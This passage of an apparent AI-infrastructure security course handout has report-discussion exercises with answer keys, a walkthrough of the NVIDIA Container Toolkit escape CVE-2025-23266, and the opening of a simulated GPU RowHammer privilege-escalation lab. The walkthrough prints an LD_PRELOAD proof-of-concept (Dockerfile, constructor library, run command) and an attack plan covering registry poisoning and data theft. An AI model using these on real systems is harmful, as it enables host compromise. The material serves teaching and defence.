
# W1D6 - Securing AI Infrastructure: From Documents to Exploits

This final day combines policy analysis, vulnerability research, and hands-on attack chain exploration to understand AI infrastructure security across multiple dimensions. You'll analyze three foundational security documents, walk through a real container escape vulnerability discovered by Wiz, and implement the complete GPUBreach attack chain.

## Table of Contents

- [Content & Learning Objectives](#content--learning-objectives)
    - [1️⃣ Document Analysis Discussion (2 hours)](#1️⃣-document-analysis-discussion-2-hours)
    - [2️⃣ CVE-2025-23266 Walkthrough (45 minutes)](#2️⃣-cve-2025-23266-walkthrough-45-minutes)
    - [3️⃣ GPUBreach Attack Chain (3+ hours)](#3️⃣-gpubreach-attack-chain-3-hours)
- [Setup](#setup)
- [1️⃣ Document Analysis Discussion (2 hours)](#1️⃣-document-analysis-discussion-2-hours-1)
    - [Required Reading Materials](#required-reading-materials)
    - [Quick Reference Guide](#quick-reference-guide)
    - [Part 1: RAND Framework - Understanding the Threat Landscape (40 minutes)](#part-1-rand-framework---understanding-the-threat-landscape-40-minutes)
        - [Exercise 1.1: Operational Capability Classification](#exercise-11-operational-capability-classification)
        - [Exercise 1.2: Security Level Mapping](#exercise-12-security-level-mapping)
    - [Part 2: IAPS Data Center Security - Critical Attack Vectors (35 minutes)](#part-2-iaps-data-center-security---critical-attack-vectors-35-minutes)
        - [Exercise 2.1: Attack Vector Prioritization](#exercise-21-attack-vector-prioritization)
        - [Exercise 2.2: IAPS Policy Framework Implementation](#exercise-22-iaps-policy-framework-implementation)
    - [Part 3: SL5 Novel Recommendations - Next-Generation Controls (35 minutes)](#part-3-sl5-novel-recommendations---next-generation-controls-35-minutes)
        - [Exercise 3.1: Five-Domain Architecture Analysis](#exercise-31-five-domain-architecture-analysis)
        - [Exercise 3.2: SL5 Implementation Feasibility Assessment](#exercise-32-sl5-implementation-feasibility-assessment)
    - [Synthesis Exercise: Cross-Report Integration (10 minutes)](#synthesis-exercise-cross-report-integration-10-minutes)
- [2️⃣ CVE-2025-23266 Walkthrough: NVIDIA Container Toolkit Escape (45 minutes)](#2️⃣-cve-2025-23266-walkthrough-nvidia-container-toolkit-escape-45-minutes)
    - [Background: Understanding the Vulnerability](#background-understanding-the-vulnerability)
    - [Exercise 2.1: Attack Vector Analysis](#exercise-21-attack-vector-analysis)
    - [Exercise 2.2: Defense Analysis and Mitigation](#exercise-22-defense-analysis-and-mitigation)
    - [Exercise 2.3: Broader Implications for AI Infrastructure Security](#exercise-23-broader-implications-for-ai-infrastructure-security)
- [3️⃣ GPUBreach Attack Chain: RowHammer to Root (3+ hours)](#3️⃣-gpubreach-attack-chain-rowhammer-to-root-3-hours)
    - [Phase 1 — Understanding the chain (no code, 30 minutes)](#phase-1-—-understanding-the-chain-no-code-30-minutes)
    - [Phase 2 — Must-finish: driving the attack to root](#phase-2-—-must-finish-driving-the-attack-to-root)
    - [Phase 3 — Stretch: digging into the primitives](#phase-3-—-stretch-digging-into-the-primitives)
    - [Phase 4 — Debrief (discussion)](#phase-4-—-debrief-discussion)
- [Initial environment inspection](#initial-environment-inspection)
- [Simulator cheat sheet](#simulator-cheat-sheet)
- [1️⃣ Phase 1 — Understanding (30 min, no code)](#1️⃣-phase-1-—-understanding-30-min-no-code)
    - [Exercise 1.1: DRAM row organisation and the RowHammer threshold](#exercise-11-dram-row-organisation-and-the-rowhammer-threshold)
    - [Exercise 1.2: GPU PTEs and the aperture bit](#exercise-12-gpu-ptes-and-the-aperture-bit)
    - [Exercise 1.3: Why the IOMMU does not block this write](#exercise-13-why-the-iommu-does-not-block-this-write)
    - [Exercise 1.4: Driver OOB → privilege escalation](#exercise-14-driver-oob-→-privilege-escalation)
- [2️⃣ Phase 2 — Must-finish: driving the attack to root](#2️⃣-phase-2-—-must-finish-driving-the-attack-to-root)
    - [Exercise 2.1: Aggressor rows for double-sided hammering](#exercise-21-aggressor-rows-for-double-sided-hammering)
    - [Exercise 2.2: Hammer until a bit flips](#exercise-22-hammer-until-a-bit-flips)
    - [Exercise 2.3: Force the MMU to re-walk the flipped PTE](#exercise-23-force-the-mmu-to-re-walk-the-flipped-pte)
    - [Exercise 2.4: Craft the OOB DMA payload](#exercise-24-craft-the-oob-dma-payload)
    - [Exercise 2.5: Fire the DMA and confirm root](#exercise-25-fire-the-dma-and-confirm-root)
    - [Print the flag](#print-the-flag)
- [3️⃣ Phase 3 — Stretch: digging into the primitives (Optional)](#3️⃣-phase-3-—-stretch-digging-into-the-primitives-optional)
    - [Exercise 3.1 (Optional): Decode a PTE by hand](#exercise-31-optional-decode-a-pte-by-hand)
    - [Exercise 3.2 (Optional): Inspect the exact flipped bit](#exercise-32-optional-inspect-the-exact-flipped-bit)
    - [Exercise 3.3 (Optional): Budget the hammer against the refresh window](#exercise-33-optional-budget-the-hammer-against-the-refresh-window)
    - [Exercise 3.4 (Optional): Maximum hammer rounds inside the window](#exercise-34-optional-maximum-hammer-rounds-inside-the-window)
    - [Exercise 3.5 (Optional): The IOMMU blocks what it promises to block](#exercise-35-optional-the-iommu-blocks-what-it-promises-to-block)
    - [Exercise 3.6 (Optional): Measure the OOB overflow precisely](#exercise-36-optional-measure-the-oob-overflow-precisely)
    - [Exercise 3.7 (Optional): A tighter payload](#exercise-37-optional-a-tighter-payload)
- [GPUBreach Summary](#gpubreach-summary)
    - [Key Takeaways](#key-takeaways)
    - [Further Reading](#further-reading)
- [Final Summary](#final-summary)
    - [Key Takeaways](#key-takeaways-1)
    - [Implementation Priorities for Your Organization](#implementation-priorities-for-your-organization)
    - [Further Reading](#further-reading-1)

## Content & Learning Objectives

### 1️⃣ Document Analysis Discussion (2 hours)
Deep analysis of three foundational reports covering threat frameworks, data center security, and novel defensive approaches.

> **Learning Objectives**
> - Evaluate threat actor classifications and security level frameworks
> - Analyze critical attack vectors in AI data center environments
> - Assess implementation feasibility of next-generation security controls

### 2️⃣ CVE-2025-23266 Walkthrough (45 minutes)
Guided analysis of the NVIDIA Container Toolkit vulnerability discovered by Wiz Research, understanding the attack mechanics without hands-on exploitation.

> **Learning Objectives**
> - Understand LD_PRELOAD based container escape techniques
> - Analyze how NVIDIA Container Toolkit exposes host privileges to containers
> - Evaluate the security implications of GPU container runtime architectures

### 3️⃣ GPUBreach Attack Chain (3+ hours)
Complete implementation of a GPU-based privilege escalation chain combining RowHammer, aperture bit flipping, IOMMU bypass, and kernel exploitation.

> **Learning Objectives**
> - Execute end-to-end GPU-based attack chains
> - Understand GDDR memory vulnerabilities and exploitation techniques
> - Implement kernel privilege escalation through GPU DMA manipulation


## Setup

Create a file named `day6_final_answers.py` in the `day6-infrastructure` directory. This will be your answer file for today.

If you see a code snippet here in the instruction file, copy-paste it into your answer file. Keep the `# %%` line to make it a Python code cell.

**Start by pasting the code below in your day6_final_answers.py file.**


---

## 1️⃣ Document Analysis Discussion (2 hours)

This discussion session guides you through three foundational reports on AI infrastructure security. You'll work through specific sections of each document to understand threat frameworks, security implementations, and novel defensive approaches.

### Required Reading Materials

**Before the session, ensure you have access to:**

1. **RAND Corporation Report**: "Securing AI Model Weights" (RRA2849-1)
   - **Link**: https://www.rand.org/content/dam/rand/pubs/research_reports/RRA2800/RRA2849-1/RAND_RRA2849-1.pdf
   - **Alternative**: Search for "RAND RRA2849-1 AI model weights security"

2. **IAPS Research**: "Accelerating AI Data Center Security Research and Implementation"
   - **Link**: https://www.iaps.ai/research/accelerating-ai-data-center-security
   - **Note**: Full research findings and policy recommendations available on site

3. **SL5 Task Force**: "Novel Recommendations" (November 2025)
   - **Local File**: `./SL5_NOVEL-RECOMMENDATIONS.pdf` (in this directory)
   - **Note**: Preliminary draft with five security domain memos

### Quick Reference Guide

**Key Sections for Exercises:**

**RAND Report:**
- Operational Capability Levels (OC1-OC5): Section 2
- Security Level Framework (SL1-SL5): Section 3
- Protected Environments: Table 3-1
- Attack Vector Examples: Appendix B

**IAPS Research:**
- Three Critical Threat Areas: Main article sections 1-3
- Four Core Policy Recommendations: Conclusion section
- Side-Channel Attacks: Technical details in section 1
- Supply Chain Vulnerabilities: Section 2

**SL5 Document:**
- Supply Chain Security: Pages 8-17
- Network Security: Pages 18-31
- Machine Security: Pages 32-40
- Physical Security: Pages 41-50
- Personnel Security: Pages 51-60

### Part 1: RAND Framework - Understanding the Threat Landscape (40 minutes)

#### Exercise 1.1: Operational Capability Classification

> **Difficulty**: 🔴🔴⚪⚪⚪
> **Importance**: 🔵🔵🔵🔵🔵

**Task**: Open the RAND report and locate the Operational Capability (OC) classifications section.

**Questions for Group Discussion:**
1. According to RAND, what distinguishes OC4 from OC5 threat actors?
2. Which OC level can realistically compromise GPU firmware supply chains?
3. How does RAND estimate the cost difference between OC2 and OC5 operations?

**Group Exercise**: Read the attack vector examples in the RAND report and classify each scenario:

- **Scenario A**: Social engineering attack against ML researchers to steal cloud credentials
- **Scenario B**: Custom hardware implant placed during chip manufacturing
- **Scenario C**: Insider threat using legitimate access to copy model checkpoints
- **Scenario D**: Advanced persistent threat with multiple zero-day exploits

<details>
<summary><b>Answer Key (RAND Classifications)</b></summary><blockquote>

- **Scenario A**: **OC2-OC3** - Requires moderate social engineering capability but limited technical resources
- **Scenario B**: **OC5** - Supply chain hardware compromise requires nation-state level access and resources
- **Scenario C**: **OC1-OC3** - Insider threats can be executed with minimal sophistication but require access
- **Scenario D**: **OC4-OC5** - Zero-day development and sophisticated persistence requires significant resources

**Key RAND Insight**: The report emphasizes that software supply chain attacks are "among the cheapest and most scalable attacks" while hardware attacks are "feasible for well-resourced nation-state attackers at OC5."

</blockquote></details>

#### Exercise 1.2: Security Level Mapping

> **Difficulty**: 🔴🔴🔴⚪⚪
> **Importance**: 🔵🔵🔵🔵⚪

**Task**: Find the Security Level (SL1-SL5) framework in the RAND report.

**Analysis Questions:**
1. What are the five "protected environments" that RAND identifies?
2. At what model capability threshold does RAND suggest SL4 becomes necessary?
3. Which security level requires "classified facility-level physical security"?

**Mapping Exercise**: Based on the RAND framework, assign appropriate security levels:

| Environment | Current Practice | RAND SL Recommendation | Justification |
|-------------|-----------------|------------------------|---------------|
| Research Lab (Pre-training) | Standard enterprise security | ? | ? |
| Production Training (Frontier Model) | Enhanced cloud security | ? | ? |
| Public API Deployment | SOC 2 compliance | ? | ? |
| Internal Model Testing | Basic access controls | ? | ? |
| On-Premises Inference | Hardware security modules | ? | ? |

<details>
<summary><b>RAND Security Level Analysis</b></summary><blockquote>

| Environment | RAND SL Recommendation | Justification from Report |
|-------------|------------------------|---------------------------|
| Research Lab (Pre-training) | **SL2-SL3** | Pre-publication research requires enhanced protection but not maximum security |
| Production Training (Frontier Model) | **SL4-SL5** | Highest value target requiring "classified facility-level physical security" |
| Public API Deployment | **SL3** | Deployed models need high protection but operational considerations limit SL4+ |
| Internal Model Testing | **SL3** | Internal deployment with controlled access to model capabilities |
| On-Premises Inference | **SL2-SL3** | Depends on model capability and deployment context |

**RAND Key Quote**: "SL4 can plausibly be reached incrementally, SL5 can likely only be reached by a radical reduction in the hardware and software stack that is trusted."

</blockquote></details>

### Part 2: IAPS Data Center Security - Critical Attack Vectors (35 minutes)

#### Exercise 2.1: Attack Vector Prioritization

> **Difficulty**: 🔴🔴⚪⚪⚪
> **Importance**: 🔵🔵🔵🔵🔵

**Task**: Locate the "Three Critical Threat Areas" section in the IAPS research document.

**Reading Assignment**: Each group takes one threat area and presents to others:
- **Group A**: Side-Channel Attacks
- **Group B**: Hardware Supply Chain Vulnerabilities
- **Group C**: Model Weight Exfiltration

**Questions for Each Group:**
1. What specific technical mechanism does IAPS describe for this attack?
2. Why are AI workloads particularly vulnerable compared to traditional systems?
3. What defensive measures does IAPS recommend?

**Cross-Group Analysis**: After presentations, discuss:
- Which attack vector is most cost-effective for adversaries?
- Which is hardest to detect once deployed?
- Which requires the most sophisticated adversary capabilities?

<details>
<summary><b>IAPS Attack Vector Analysis</b></summary><blockquote>

**Side-Channel Attacks:**
- **Mechanism**: Measure electromagnetic/power emissions to extract secrets
- **AI Vulnerability**: Predictable computation patterns leak encryption keys/model parameters
- **Defense**: Shielded enclosures, power filtering, algorithmic countermeasures

**Supply Chain Vulnerabilities:**
- **Mechanism**: Hardware tampering during manufacturing creates persistent backdoors
- **AI Vulnerability**: Geographic concentration of manufacturing in potentially adversarial nations
- **Defense**: Trusted supplier diversification, component verification, secure sourcing

**Weight Exfiltration:**
- **Mechanism**: High-value terabyte-scale assets transferred through various channels
- **AI Vulnerability**: Model weights are immediately executable unlike traditional IP
- **Defense**: Network monitoring, data loss prevention, air-gapped environments

**IAPS Priority**: The research emphasizes supply chain risks due to "components manufactured in China present particular risks" while acknowledging other origins may also be vulnerable.

</blockquote></details>

#### Exercise 2.2: IAPS Policy Framework Implementation

> **Difficulty**: 🔴🔴🔴⚪⚪
> **Importance**: 🔵🔵🔵⚪⚪

**Task**: Find the "Four Core Policy Recommendations" in the IAPS document.

**Implementation Scenario**: Your organization operates three data centers with 15,000 GPUs total. Using the IAPS recommendations, design an implementation plan:

1. **Security Standards**: How would you implement "AI data center-specific security framework with progressive maturity levels"?
2. **R&D Investment**: What specific defensive technologies would you prioritize for DARPA-style funding?
3. **Intelligence Sharing**: What incident reporting requirements would you establish?
4. **Supply Chain Decoupling**: How quickly could you shift away from potentially compromised suppliers?

**Discussion Questions:**
- Which IAPS recommendation would have the highest immediate impact?
- Which faces the greatest implementation challenges?
- How do the IAPS recommendations align with or differ from RAND's SL framework?

<details>
<summary><b>IAPS Implementation Strategy</b></summary><blockquote>

**1. Security Standards (6-12 months):**
- Map current practices to maturity model (similar to RAND SL1-SL5)
- Establish certification requirements for government procurement
- Create vendor security credential demonstration programs

**2. R&D Investment (Ongoing):**
- **Side-channel hardening**: Hardware-level countermeasures for AI accelerators
- **Supply chain security**: Component verification and trusted manufacturing
- **Exfiltration prevention**: AI-enhanced monitoring and data loss prevention

**3. Intelligence Sharing (3-6 months):**
- Mandatory incident reporting for model weight compromise
- Declassified threat intelligence sharing with private sector
- Industry threat sharing communities (currently "most breaches go unreported")

**4. Supply Chain Decoupling (2-5 years):**
- Map critical component dependencies by country of origin
- Establish trusted supplier networks in allied nations
- Create redundant sourcing for security-critical components

</blockquote></details>

### Part 3: SL5 Novel Recommendations - Next-Generation Controls (35 minutes)

#### Exercise 3.1: Five-Domain Architecture Analysis

> **Difficulty**: 🔴🔴🔴🔴⚪
> **Importance**: 🔵🔵🔵🔵🔵

**Task**: Open the SL5 document and locate the "Top 5 Recommendations" for each security domain.

**Group Assignment**: Each group analyzes one SL5 domain and identifies the most novel recommendation:

- **Group A**: Supply Chain Security
- **Group B**: Network Security
- **Group C**: Machine Security

**Questions for Each Group:**
1. How does this SL5 recommendation go beyond traditional security approaches?
2. What specific technical implementation does the document suggest?
3. What are the main cost-benefit trade-offs identified?

<details>
<summary><b>SL5 Novel Recommendations Summary</b></summary><blockquote>

**Supply Chain - Architectural Isolation:**
- **Innovation**: "Progressive access restriction" with systematic reduction of privileged access ("seat management")
- **Implementation**: Weight-accessing systems run minimal, formally verified components only
- **Trade-off**: Reduced functionality vs. dramatically smaller attack surface

**Network - AI-Enhanced Cross-Domain:**
- **Innovation**: AI monitors analyze code/commands crossing security boundaries
- **Implementation**: Weaker AI models monitor stronger AI outputs for suspicious patterns
- **Trade-off**: Compute overhead vs. enabling AI research workflows securely

**Machine - Tamper-Evident Enclosures:**
- **Innovation**: Physical security extended to "entire sensitive scopes" (whole racks/rooms)
- **Implementation**: Hardware detection covering complete compute environments
- **Trade-off**: Installation complexity vs. comprehensive physical protection

**Physical - Two-Person Integrity:**
- **Innovation**: All maintenance requires two authorized individuals with body-worn cameras
- **Implementation**: Continuous recording with obstruction alarms during facility access
- **Trade-off**: Operational overhead vs. insider threat elimination

**Personnel - Industry Clearances:**
- **Innovation**: Private sector adaptation of government clearance systems
- **Implementation**: "Industry-optimized sensitivity levels" with continuous behavioral monitoring
- **Trade-off**: Talent pipeline constraints vs. insider threat mitigation

</blockquote></details>

#### Exercise 3.2: SL5 Implementation Feasibility Assessment

> **Difficulty**: 🔴🔴🔴🔴🔵
> **Importance**: 🔵🔵🔵🔵⚪

**Task**: Find the SL5 document's discussion of "3-6 month feasibility assessment" timeline.

**Real-World Scenario**: A major AI lab with the following characteristics wants to pursue SL5:
- 50,000+ GPUs across 5 geographic locations
- 1,000+ employee research organization
- Active training of 5+ frontier models simultaneously
- Commercial API serving 100M+ requests daily
- University research partnerships in 15+ countries

**Feasibility Questions** (refer to specific SL5 document sections):
1. **Supply Chain**: How many software dependencies would need to be eliminated based on SL5 "minimal trusted software stack" requirements?
2. **Network**: Is 100+ Tbps distributed training compatible with SL5 "network encryptor" bandwidth limitations?
3. **Personnel**: How many employees would require "industry-optimized clearances" and what's the talent pipeline impact?
4. **Physical**: What percentage of existing facilities could support "tamper-evident enclosures" without major reconstruction?
5. **Machine**: When will "hardware root of trust" be available in commercial AI accelerators?

**Group Decision**: Based on your analysis, vote on implementation timeline:
- **18 months**: Aggressive implementation with significant operational disruption
- **3-5 years**: Phased implementation aligned with hardware refresh cycles
- **5+ years**: Full implementation only with next-generation purpose-built facilities
- **Not feasible**: SL5 requirements incompatible with current AI development needs

<details>
<summary><b>SL5 Feasibility Reality Check</b></summary><blockquote>

**Critical Implementation Challenges:**

**Supply Chain Reality:**
- Current ML stacks have 200+ dependencies per SL5 analysis
- "Radical reduction" requires rewriting most AI development tools
- Timeline depends on availability of formally verified alternatives

**Network Bandwidth Gap:**
- Current encryptors: 100-400 Gbps maximum throughput
- Future distributed training: 100+ Tbps requirement
- Solution requires "multiplexing currently available encryptors" with unproven scalability

**Personnel Clearance Bottleneck:**
- AI talent market extremely competitive globally
- Clearance requirements could reduce available talent pool by 70-90%
- "Industry-optimized" clearances don't yet exist

**Physical Infrastructure:**
- Most existing data centers not designed for "tamper-evident enclosures"
- Retrofit costs potentially exceed new construction
- Geographic distribution conflicts with physical security requirements

**Hardware Readiness:**
- "Hardware root of trust" in AI accelerators still developmental
- Current GPU/TPU architectures lack security-first design
- 3-5 year timeline for security-enhanced AI chips

**SL5 Assessment**: Most organizations would realistically require 5+ years for full implementation, with immediate focus on highest-impact, lowest-cost controls.

</blockquote></details>

### Synthesis Exercise: Cross-Report Integration (10 minutes)

**Integration Questions:**
1. How do the RAND Security Levels (SL1-SL5) map to the IAPS policy recommendations?
2. Which SL5 novel recommendations directly address the IAPS "three critical threat areas"?
3. Where do the three frameworks contradict or provide conflicting guidance?
4. What's missing from all three reports that your organization would need to know?

**Priority Ranking Exercise**: Based on your analysis of all three documents, rank these implementation priorities:

| Priority | Recommendation | Source | Timeline | Rationale |
|----------|---------------|--------|----------|-----------|
| 1 | ? | ? | ? | ? |
| 2 | ? | ? | ? | ? |
| 3 | ? | ? | ? | ? |
| 4 | ? | ? | ? | ? |
| 5 | ? | ? | ? | ? |

---

## 2️⃣ CVE-2025-23266 Walkthrough: NVIDIA Container Toolkit Escape (45 minutes)

This section provides a guided analysis of CVE-2025-23266, the NVIDIA Container Toolkit vulnerability discovered by Wiz Research in early 2025. We'll examine the attack mechanics through Q&A rather than hands-on exploitation.

### Background: Understanding the Vulnerability

**CVE-2025-23266** is a container escape vulnerability affecting NVIDIA Container Toolkit versions through 1.17.7. The vulnerability allows malicious container images to execute arbitrary code on the host system with root privileges through an LD_PRELOAD attack vector.

**Key Resources:**
- **Wiz Research Blog**: https://www.wiz.io/blog/nvidia-ai-vulnerability-cve-2025-23266-nvidiascape
- **NVIDIA Security Bulletin**: NVIDIA Container Toolkit Advisory
- **CVE Details**: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-23266

### Exercise 2.1: Attack Vector Analysis

> **Difficulty**: 🔴🔴⚪⚪⚪
> **Importance**: 🔵🔵🔵🔵🔵

**Question 1**: How does the NVIDIA Container Toolkit create a trusted execution environment for GPU-enabled containers?

<details>
<summary>Answer</summary><blockquote>

The NVIDIA Container Toolkit (`nvidia-ctk`) acts as a bridge between Docker containers and NVIDIA GPU drivers on the host. When a container requests GPU access with `--gpus=all` or `--runtime=nvidia`, the toolkit:

1. **Device Discovery**: Scans the host for available NVIDIA GPUs and driver libraries
2. **Mount Preparation**: Identifies which host GPU devices, libraries, and binaries need to be mounted into the container
3. **Runtime Configuration**: Modifies the container's runtime environment to include GPU access paths
4. **Privilege Escalation**: Executes with elevated privileges to access hardware and modify container namespaces

The critical security assumption is that **only trusted container images** will be executed with GPU access, as the toolkit must run privileged operations on the host during container setup.

</blockquote></details>

**Question 2**: What is the LD_PRELOAD mechanism and why is it particularly dangerous in containerized environments?

<details>
<summary>Answer</summary><blockquote>

**LD_PRELOAD** is a Linux environment variable that forces the dynamic linker to load specified shared libraries before any others, effectively allowing library function interception and replacement.

**In containerized environments, LD_PRELOAD becomes dangerous because:**

1. **Cross-boundary execution**: When host binaries execute with LD_PRELOAD set from a container context, the preloaded library can execute arbitrary code
2. **Privilege inheritance**: Host processes that run with elevated privileges will execute the preloaded code with those same privileges
3. **Steganographic hiding**: Malicious libraries can be embedded within seemingly legitimate container images
4. **Persistent infection**: LD_PRELOAD can affect multiple host process executions, not just the initial container runtime

**CVE-2025-23266 Specific**: The NVIDIA Container Toolkit executes host binaries (like `nvidia-ctk`) with LD_PRELOAD environment variables inherited from the container, allowing malicious shared libraries to execute on the host with root privileges.

</blockquote></details>

**Question 3**: Walk through the complete attack chain for CVE-2025-23266. What are the key steps an attacker must perform?

<details>
<summary>Attack Chain Breakdown</summary><blockquote>

**Step 1: Malicious Container Preparation**
```dockerfile
FROM ubuntu:22.04
ENV LD_PRELOAD=/proc/self/cwd/malicious.so
ADD malicious.so /
# Container appears legitimate but includes malicious shared library
```

**Step 2: Shared Library Weaponization**
```c
// malicious.c - compiled to malicious.so
void __attribute__((constructor)) init() {
    // Code here executes when library loads
    // Can perform privilege escalation, data exfiltration, etc.
    system("echo 'compromised' > /tmp/evidence");
}
```

**Step 3: Container Execution with GPU Access**
```bash
docker run --rm --runtime=nvidia --gpus=all malicious-image
```

**Step 4: Toolkit Execution with Inherited Environment**
- Docker daemon calls `nvidia-ctk` on host to configure GPU access
- `nvidia-ctk` inherits `LD_PRELOAD=/proc/self/cwd/malicious.so` from container environment
- Host resolves `/proc/self/cwd/` to the container's working directory
- `nvidia-ctk` loads `malicious.so` and executes constructor function **with root privileges on the host**

**Step 5: Host Compromise**
- Malicious code now executes outside container boundaries
- Can install backdoors, access host filesystem, escalate privileges permanently
- Attack succeeded: container escaped to host root

</blockquote></details>

### Exercise 2.2: Defense Analysis and Mitigation

> **Difficulty**: 🔴🔴🔴⚪⚪
> **Importance**: 🔵🔵🔵🔵⚪

**Question 4**: Why didn't traditional container security measures (namespaces, cgroups, seccomp) prevent this attack?

<details>
<summary>Answer</summary><blockquote>

**Traditional container security operates at different layers:**

1. **Namespaces**: Isolate process, network, filesystem views within the container but don't control host process execution
2. **Cgroups**: Limit resource usage (CPU, memory) but don't restrict environment variable inheritance
3. **Seccomp**: Filters system calls within the container but `nvidia-ctk` execution happens on the host

**CVE-2025-23266 bypasses these because:**

- The vulnerable code path occurs in **host processes** (`nvidia-ctk`), not container processes
- Environment variable inheritance is a **legitimate Docker feature** required for GPU toolkit functionality
- The attack doesn't require container breakout through syscalls or namespace violations
- Host privilege escalation happens through **legitimate shared library loading**, not exploiting kernel vulnerabilities

**Key insight**: Container runtimes that execute host utilities with elevated privileges create new attack surfaces beyond traditional container isolation.

</blockquote></details>

**Question 5**: What specific mitigations did NVIDIA implement in the patched version, and what are the broader lessons for container runtime security?

<details>
<summary>Mitigation Analysis</summary><blockquote>

**NVIDIA's Specific Fixes (v1.17.8+):**

1. **Environment Sanitization**: `nvidia-ctk` now filters dangerous environment variables including `LD_PRELOAD` before execution
2. **Path Validation**: Stronger validation of library paths to prevent `/proc/self/cwd/` resolution tricks
3. **Execution Context Isolation**: Separate the runtime environment of host toolkit execution from container environment inheritance

**Broader Container Runtime Lessons:**

1. **Minimize Host Execution**: Container runtimes should minimize the need for privileged host process execution
2. **Environment Isolation**: Host utilities should never inherit untrusted environment variables from containers
3. **Principle of Least Privilege**: GPU access shouldn't require full root privileges for toolkit execution
4. **Secure Defaults**: Container runtimes should whitelist safe environment variables rather than blacklisting dangerous ones

**Architectural Recommendations:**

- **Hardware-isolated GPU sharing**: Technologies like SR-IOV and MIG reduce the need for privileged host toolkit execution
- **Sandboxed runtimes**: gVisor, Kata Containers provide stronger isolation between container and host execution contexts
- **Device plugins**: Kubernetes device plugins can manage GPU resources without runtime privilege escalation

</blockquote></details>

**Question 6**: How would an attacker discover and exploit this vulnerability in a real-world scenario?

<details>
<summary>Real-World Attack Scenario</summary><blockquote>

**Discovery Phase:**
1. **Version enumeration**: Attacker determines NVIDIA Container Toolkit version through Docker API queries or container runtime errors
2. **Environment testing**: Deploy test containers to understand environment variable inheritance behavior
3. **Privilege mapping**: Identify which host processes execute during GPU container initialization

**Exploitation Development:**
1. **Payload crafting**: Develop shared library with persistence, data exfiltration, or lateral movement capabilities
2. **Container disguise**: Create legitimate-looking container image (ML training, gaming, crypto mining) that includes malicious library
3. **Social engineering**: Convince targets to run the container for "GPU performance testing" or "algorithm optimization"

**Attack Execution:**
1. **Registry poisoning**: Upload malicious container to public or private registries with enticing descriptions
2. **Supply chain insertion**: Compromise legitimate container build processes to inject malicious libraries
3. **Insider deployment**: Use legitimate access to deploy malicious containers in enterprise environments

**Post-Exploitation:**
1. **Persistence establishment**: Install backdoors, create new user accounts, modify system configurations
2. **Lateral movement**: Discover other systems with GPU infrastructure, expand container deployment
3. **Data exfiltration**: Access model weights, training data, or other sensitive AI assets stored on compromised hosts

**Real Impact**: This vulnerability was particularly dangerous because GPU-enabled containers are commonly deployed for ML training and inference in high-value environments with sensitive AI models.

</blockquote></details>

### Exercise 2.3: Broader Implications for AI Infrastructure Security

> **Difficulty**: 🔴🔴🔴🔴⚪
> **Importance**: 🔵🔵🔵🔵🔵

**Discussion Questions:**

1. **Trust Boundaries**: How does CVE-2025-23266 challenge assumptions about trust boundaries in GPU-enabled containerized AI workloads?

2. **Supply Chain Risk**: What are the implications for AI model development when container images can compromise training infrastructure?

3. **Detection Challenges**: Why would traditional security monitoring struggle to detect this type of container escape?

4. **Policy Impact**: How should this vulnerability influence organizational policies around third-party container usage in AI development environments?

<details>
<summary>Discussion Framework</summary><blockquote>

**Trust Boundary Analysis:**
- Traditional assumption: Container isolation provides sufficient security for multi-tenant GPU sharing
- Reality: GPU runtime requirements create privileged host execution paths that bypass container isolation
- Implication: GPU-enabled containers should be treated as trusted workloads requiring stronger vetting

**Supply Chain Considerations:**
- Container registries become critical security infrastructure for AI development
- Need for signature verification, image scanning, and provenance tracking for GPU-enabled containers
- Risk of compromised training environments leading to model backdooring or data poisoning

**Detection Challenges:**
- Host process execution appears legitimate (nvidia-ctk running normally)
- No unusual container behavior or resource consumption
- Requires monitoring of shared library loading and environment variable inheritance

**Organizational Policy Recommendations:**
- Restrict GPU container execution to signed, audited images only
- Implement least-privilege GPU access (MIG, device plugins) to reduce host toolkit execution
- Monitor and log all GPU container deployments with enhanced scrutiny
- Regular security updates for container runtime components, not just application containers

</blockquote></details>

---

## 3️⃣ GPUBreach Attack Chain: RowHammer to Root (3+ hours)

In this lab you will walk through the *GPUBreach* attack chain end-to-end against a simulated GDDR6 + NVIDIA-style driver stack. The chain fuses several well-known primitives into a single full-system compromise:

1. A **RowHammer** bit flip in GPU DRAM corrupts the **aperture bit** of a GPU page-table entry, silently redirecting the page from local VRAM to host system memory.
2. The next GPU DMA against that virtual address crosses PCIe into a **driver-managed DMA buffer** on the CPU side.
3. An **out-of-bounds write** in the driver's fast path allows the DMA payload to overflow the buffer into an **adjacent kernel credential struct**.
4. The attacker sets their `euid` to 0 and escalates to **root** — with the IOMMU enabled the whole time.

Everything runs inside `gpubreach_sim/`, a small Python package that models GDDR6 rows, GPU PTEs, an IOMMU, and a driver page. You will *not* modify the simulator. You will implement the chain from the outside, in small steps, exactly the way a real attacker drives the attack against a kernel.

The lab is structured as **many bite-sized exercises**, each with a test you can run to know you got it right. It is split into:

- **Phase 1 — Understanding** (30 min, no code): four comprehension questions that explain what's going on before you start writing code.
- **Phase 2 — Must-finish track** (~30–45 min): five tiny coding exercises, one per step of the chain. Together they drive the attack from bit flip to printed flag.
- **Phase 3 — Stretch track** (as much time as you have): seven optional bite-sized exercises that dig deeper into the primitives.
- **Phase 4 — Debrief** (15 min): four open discussion questions.

If you only complete Phase 1 + Phase 2, you have seen a full GPUBreach chain from bit flip to root. The stretch exercises are a menu — pick what interests you, skip what doesn't. They are all short.

**Recommended reading (before the lab):**

- Jattke et al., *[GPUHammer: Rowhammer Attacks on GPU Memories are Practical](https://gpuhammer.com/)* (USENIX Security 2025)
- Kim et al., *[Flipping Bits in Memory Without Accessing Them](https://users.ece.cmu.edu/~yoonguk/papers/kim-isca14.pdf)* (the original RowHammer paper)
- Seaborn & Dullien, *[Exploiting the DRAM rowhammer bug to gain kernel privileges](https://googleprojectzero.blogspot.com/2015/03/exploiting-dram-rowhammer-bug-to-gain.html)* (Project Zero's CPU-side PTE-flip exploit, the direct ancestor of the aperture-flip idea used by GPUBreach)

### Phase 1 — Understanding the chain (no code, 30 minutes)

Four short comprehension questions on the four primitives the chain stitches together. You answer them in your answers file.

> **Learning Objectives**
> - Explain DRAM row organisation and the RowHammer activation threshold
> - Describe the layout of a GPU PTE and the role of the aperture bit
> - Argue precisely why the IOMMU does not block this DMA write
> - Trace how a driver OOB write turns into a privilege escalation

### Phase 2 — Must-finish: driving the attack to root

Exactly five bite-sized coding exercises, each with a test — one per step of the chain. Together they bit-flip a PTE, re-walk it through the GPU MMU, and DMA an oversized payload into a kernel cred struct to get root.

> **Learning Objectives**
> - Compute aggressor rows for double-sided hammering
